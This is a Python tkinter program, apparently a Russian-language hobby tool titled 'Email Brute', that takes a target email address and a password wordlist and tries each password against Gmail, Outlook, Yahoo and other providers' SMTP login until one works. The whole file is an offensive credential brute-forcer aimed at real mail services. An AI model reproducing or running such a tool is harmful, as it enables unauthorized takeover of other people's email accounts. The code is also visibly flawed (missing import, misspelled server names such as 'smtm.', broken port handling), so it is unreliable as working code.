from tkinter import filedialog as fd
from tkinter import *
from tkinter import messagebox
import threading
import smtplib


root=Tk()
root.title(u'Email Brute, by GorDX1')
root.geometry('500x400+300+200') 

root.resizable(False, False)
text1=Text(root, height=1, width=25, font='Arial 14')
text1.pack()
text1.place(x = 15, y = 50)


var1=IntVar()
var2=IntVar()
var3=IntVar()
var4=IntVar()
var5=IntVar()
var6=IntVar()


serv = None
port = 587

def mail():
	login = text1.get('1.0', 'end')
	while True:
		try:
			if login or file_name:
				password_list = file_name
				if os.path.exists(password_list):
					file = open(password_list, 'r')
					break
				else:
					pass
		except:
			messagebox.showwarning(title='Warning', message='Не указон словарь или Email')
			return

	def check_mail():
		global serv
		if var1.get() == 1:
			serv = 'smtp.gmail.com'
			port = 465
		if var2.get() == 1:
			serv = 'smtp-mail.outlook.com'
			port = 587
		if var3.get() == 1:
			serv = 'smtm.mail.yahoo.com'
			port = 587
		if var4.get() == 1:
			serv = 'smtm.mail.att.net'
			port = 465
		if var5.get() == 1:
			serv = 'smtm.mail.com'
			port = 587
		if var6.get() == 1:
			serv = 'smtm.comcast.com'
			port = 587


	def brut():
		messagebox.showinfo(title='Info', message='Атака начелась')
		try:
			smtp = smtplib.SMTP(str(serv), int(port))
			smtp.ehlo()
			smtp.starttls()
		except:
			messagebox.showwarning(title='Warning', message='Плохое соединение')
			return
		for line in file:
			try:
				passw = line.strip('\r\n')
				smtp.login(login, passw)
				messagebox.showinfo(title='Good', message='password: ' + passw)
				return
			except:
				pass

		messagebox.showinfo(title='Warning', message='Взлом не удался')

	check_mail()

	t1 = threading.Thread(target=brut)
	t1.start()


def fileopen():
	global file_name
	file_name = fd.asksaveasfilename(filetypes=(("TXT files", "*.txt"),
                                        ("HTML files", "*.html;*.htm"),
                                                ("All files", "*.*") ))


check1=Checkbutton(root,text=u'Gmail',variable=var1,onvalue=1,offvalue=0)
check1.pack()
check1.place(x = 400, y = 10)

check2=Checkbutton(root,text=u'Outlook',variable=var2,onvalue=1,offvalue=0)
check2.pack()
check2.place(x = 400, y = 45)

check3=Checkbutton(root,text=u'Yahoo',variable=var3,onvalue=1,offvalue=0)
check3.pack()
check3.place(x = 400, y = 75)

check4=Checkbutton(root,text=u'At&T',variable=var4,onvalue=1,offvalue=0)
check4.pack()
check4.place(x = 400, y = 105)

check5=Checkbutton(root,text=u'Mail.com',variable=var5,onvalue=1,offvalue=0)
check5.pack()
check5.place(x = 400, y = 135)

check6=Checkbutton(root,text=u'Comcast',variable=var6,onvalue=1,offvalue=0)
check6.pack()
check6.place(x = 400, y = 165)

file = Button(text = 'Файл со словарем', command = fileopen)
file.pack()
file.place(x = 15, y = 120)

label1 = Label(text="Введите Email", fg="#912700", bg="#849187")
label1.pack()
label1.place(x = 15, y = 80)

crack = Button(text = 'Брут', height=2, width=12, command = mail)
crack.pack()
crack.place(x = 215, y = 280)

root.mainloop()



